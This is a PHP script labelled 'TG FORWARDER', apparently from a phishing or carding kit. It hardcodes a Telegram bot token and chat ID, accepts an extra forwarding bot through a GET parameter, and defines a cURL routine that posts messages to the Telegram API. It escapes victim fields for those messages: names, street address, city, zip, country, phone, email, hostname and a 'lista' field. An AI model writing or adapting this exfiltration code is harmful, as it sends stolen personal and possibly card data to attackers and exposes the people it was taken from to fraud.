<?php

#-------------- [ TG FORWARDER ] ---------------#

// Default Telegram Bot Token and Chat ID
$default_bot_token = '7135381471:AAHGNDxzMXaiMIbedvTgD4bSBDhepdJPppw';
$default_chat_id = '1942336867';

// Initialize additional bot token and chat ID as null
$additional_bot_token = null;
$additional_chat_id = null;

// Check if Telegram Forwarder is provided in the request
if (isset($_GET['telegramForwarder']) && substr_count($_GET['telegramForwarder'], ':') >= 2) {
    $parts = explode(':', $_GET['telegramForwarder'], 2); // Split into 2 parts only
    $additional_chat_id = $parts[0]; // First part is chat_id
    $additional_bot_token = $parts[1]; // Remaining part is the full bot token
}

// Function to send a message to Telegram
function sendToTelegram($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'MarkdownV2' // Use MarkdownV2 for proper formatting
    ];

    // Use cURL to send the request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
         'Error sending message to Telegram: ' . curl_error($ch) . '<br>';
    } else {
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode != 200) {
             'Telegram API responded with code: ' . $httpCode . '<br>';
             'Response: ' . $response . '<br>';
        } else {
             'Message sent successfully to bot with token ending in ' . substr($bot_token, -5) . '<br>';
        }
    }

    curl_close($ch);
}

function escapeMarkdownV2($text) {
    return str_replace(
        ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'],
        ['\_', '\*', '\[', '\]', '\(', '\)', '\~', '\`', '\>', '\#', '\+', '\-', '\=', '\|', '\{', '\}', '\.', '\!'],
        $text
    );
}

// Escape all variables to avoid MarkdownV2 errors
$escaped_hostname = escapeMarkdownV2($hostname);
$escaped_fname = escapeMarkdownV2($fname);
$escaped_lname = escapeMarkdownV2($lname);
$escaped_street = escapeMarkdownV2($street);
$escaped_city = escapeMarkdownV2($city);
$escaped_state = escapeMarkdownV2($state);
$escaped_zip = escapeMarkdownV2($zip);
$escaped_country = escapeMarkdownV2($country);
$escaped_phone = escapeMarkdownV2($phone);
$escaped_email = escapeMarkdownV2($email);
$escaped_lista = escapeMarkdownV2($lista);

?>
